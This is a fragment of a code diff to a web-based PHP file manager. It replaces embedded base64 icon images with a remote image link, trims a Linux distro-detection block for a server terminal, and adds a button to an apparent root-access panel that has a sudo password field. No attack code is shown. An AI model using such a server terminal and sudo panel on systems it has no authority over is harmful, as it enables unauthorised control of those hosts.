-     <div class="brand-icon"><img class="bi-b" alt="File Manager" src="data:image/png;base64,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"><img class="bi-w" alt="" src="data:image/png;base64,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"></div>
+     <div class="brand-icon"><img src="https://raw.githubusercontent.com/orgezeo/marshal-file-manager/refs/heads/main/images/icons/mfm.png" alt="File Manager"></div>
   </a>
   <div class="dv"></div>
   <nav class="bc" aria-label="Breadcrumb">
@@ -41994,15 +43671,12 @@ input.inp,select.inp{height:32px}
   }
   $termRootPath=(string)($fm->getRoot()?:DIRECTORY_SEPARATOR);
   $termHostLabel=gethostname()?:'server';
-  /* R80 · which penguin belongs next to the host: the distro it actually is */
   $termDistroLabel='Linux';
   $termDistroKey='linux';
   if(@is_file('/etc/os-release')){
     $__os=@file_get_contents('/etc/os-release');
     if($__os!==false){
       if(stripos($__os,'kali')!==false){$termDistroLabel='Kali Linux';$termDistroKey='kali';}
-      elseif(stripos($__os,'debian')!==false){$termDistroLabel='Debian';$termDistroKey='linux';}
-      elseif(stripos($__os,'ubuntu')!==false){$termDistroLabel='Ubuntu';$termDistroKey='linux';}
       elseif(preg_match('/^PRETTY_NAME="?([^"\n]+)/m',$__os,$__m)){$termDistroLabel=trim($__m[1]);}
     }
   }
@@ -44224,6 +45898,9 @@ input.inp,select.inp{height:32px}
         <div class="rk-now" id="rkNow"></div>
         <div class="rk-facts" id="rkFacts"></div>
         <div class="rk-steps" id="rkSteps"></div>
+        <button type="button" class="rk-follow" id="rkFollow" aria-label="Follow the run again">
+          <svg viewBox="0 0 24 24"><path d="M12 4v14"/><path d="m6 12 6 6 6-6"/></svg>follow the run
+        </button>
         <div class="rk-more">
           <input type="password" id="rootPassQuick" class="inp" placeholder="sudo password (optional)" autocomplete="off" style="display:none">
           <button type="button" class="btn btn-g" id="rkPassBtn">Use a sudo password</button>
